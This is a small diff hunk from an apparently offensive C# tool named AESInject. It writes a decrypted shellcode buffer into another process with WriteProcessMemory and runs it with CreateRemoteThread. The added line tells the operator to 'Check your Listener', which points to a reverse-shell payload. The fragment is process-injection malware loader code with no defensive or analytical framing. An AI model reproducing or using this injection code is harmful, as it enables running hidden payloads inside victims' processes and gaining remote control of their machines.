@@ -47,6 +47,7 @@ namespace AESInject
             IntPtr outSize;
             WriteProcessMemory(hProcess, addr, DShell, DShell.Length, out outSize);
             IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            Console.WriteLine("Check your Listener --- san3ncrypt3d");
 
         }
 
